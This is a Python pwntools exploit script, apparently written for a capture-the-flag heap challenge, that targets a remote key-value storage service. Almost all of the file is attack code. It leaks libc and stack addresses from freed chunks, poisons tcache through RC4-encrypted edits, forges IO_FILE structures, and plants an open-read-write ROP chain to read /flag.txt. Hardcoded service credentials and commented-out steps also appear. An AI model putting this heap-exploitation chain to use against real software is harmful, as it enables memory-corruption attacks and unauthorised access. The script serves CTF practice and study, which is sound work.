from turtle import Turtle
from pwncli import *
from pwn import *
from rc4 import *
import cryptography
import string
import ctypes
from Crypto.Util.number import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

elf = ELF(file_name)

def dbg(input=''):
    gdb.attach(p,input)
def tob(a):
    if isinstance(a, str):
        return bytes(a,encoding="latin1")
    elif isinstance(a,bytes) or isinstance(a,bytearray):
        return a
    else:
        return bytes(str(a),encoding="latin1")
def dbgg():
    raw_input()

debug = 1
username = "4dm1n"
password = "985da4f8cb37zk"
flag = 0 


def rc4_encrypt(key, data):
    S = list(range(256))
    j = 0
    out = []

    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # Pseudo-random generation algorithm (PRGA)
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(char ^ k)

    return bytes(out)

def save_data(key,len,data):
    p.sendlineafter("5. Exit","1")
    p.sendlineafter("Input the key:",key)
    p.sendlineafter("Input the value size:",len)
    p.sendlineafter("Input the value: ",data)

def read_data(key):
    p.sendlineafter("5. Exit","2")
    p.sendlineafter("Input the key:",key)

def delete_data(key):
    p.sendlineafter("5. Exit","3")
    p.sendlineafter("Input the key: ",key)

def edit_data(key,data):
    p.sendlineafter("5. Exit","4")
    p.sendlineafter("Input the key: ",key)
    p.sendlineafter("Input the value: ",data)

def house_of_some_read(libc_base,read_from, len, _chain):
    fake_IO_FILE = IO_FILE_plus_struct()
    fake_IO_FILE.flags = 0x8000 | 0x40 | 0x1000
    fake_IO_FILE.fileno = 0
    fake_IO_FILE._mode = 0
    fake_IO_FILE._IO_write_base = read_from
    fake_IO_FILE._IO_write_ptr = read_from+len
    fake_IO_FILE.chain = _chain
    fake_IO_FILE.vtable = libc_base + libc.sym['_IO_file_jumps'] - 0x8
    return bytes(fake_IO_FILE)

def house_of_some_write(libc_base,write_from, len, _chain):
    fake_IO_FILE = IO_FILE_plus_struct()
    fake_IO_FILE.flags = 0x8000 | 0x800 | 0x1000
    fake_IO_FILE.fileno = 1
    fake_IO_FILE._mode = 0
    fake_IO_FILE._IO_write_base = write_from
    fake_IO_FILE._IO_write_ptr = write_from + len
    fake_IO_FILE.chain = _chain
    fake_IO_FILE.vtable = libc_base+ libc.sym['_IO_file_jumps']
    return bytes(fake_IO_FILE)




RC4_key = b"s4cur1ty_p4ssw0rd"
# if debug:

p = remote("0192d69ceea77834bea840637e8159b8.sgz2.dg05.ciihw.cn",45172 )
p.sendlineafter("Input your username:","4dm1n")
p.sendlineafter("Input your password:","985da4f8cb37zkj")
save_data("1",str(0x200),b"A"*20)
save_data("2",str(0x200),b"B"*20)
binsh = rc4_encrypt(RC4_key, b'/bin/sh')
save_data("3",str(0x200),binsh)
# delete_data("1")
# delete_data("2")
for i in range(4,4+9):
    save_data(str(i),str(0x250),b"E"*20)
for i in range(4,4+8):    
    delete_data(str(i))
read_data("11")
p.recvuntil("[key,value] = [11,")
data = p.recv(20)
li(data)

data2 = (rc4_encrypt(RC4_key, data))
libc = ELF("/home/zephyr/tool/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6")
libc_base = bytes_to_long(data2[:6][::-1])
libc_base = libc_base - (0x7f99f3ad6ca0 - 0x7f99f36eb000)
io_list_all = libc_base + libc.sym["__environ"] - 0x200
li(hex(io_list_all))
# li("Done")

delete_data("1")
delete_data("2")
read_data("2")
p.recvuntil("[key,value] = [2,")
data = p.recv(20)
li(data)
data2 = (rc4_encrypt(RC4_key, data))
li(data2)

target = rc4_encrypt(RC4_key, p64(io_list_all))
edit_data("2",target)

write_addr = 0x62b000 + libc_base

# payload = house_of_some_read
system_addr = libc_base + libc.sym["system"]
save_data("1",str(0x200),b"A"*20)
payload = house_of_some_read(libc_base,write_addr,0x90,write_addr)

save_data("2",str(0x200),b'a'*0x200)

read_data('2')

p.recvuntil(b'a'*0x200)
leak_stack = u64(p.recv(6) + b'\x00\x00') 
success(hex(leak_stack))

control_stack = leak_stack - 0x1d0

success(hex(control_stack))

save_data('4',str(0X200),b'a')
save_data('5',str(0x200),b'b')

delete_data('5')
delete_data('4')

new_target_fd = rc4_encrypt(RC4_key, p64(control_stack))
edit_data('4', new_target_fd)

save_data('6',str(0x200),b'rubbish')
# gdb.attach(p)
libc.address = libc_base
gift['io'] = p
gift['libc'] = libc


CurrentGadgets.set_find_area(find_in_elf=False, find_in_libc=True, do_initial=False)
pad2 = CurrentGadgets.orw_chain(control_stack, flag_fd=3)
pad = CurrentGadgets.orw_chain(control_stack+len(pad2), flag_fd=3)
pad += b'/flag.txt\x00\x00\x00'



save_data('7',str(0x200), rc4_encrypt(RC4_key, pad))


# edit 4

# leak stack 之后继续劫持tcache


# edit_data("2","a")
# read_data("2")
# li(hex(free_hook))


# 打 House of some



# delete_data("3")

p.interactive()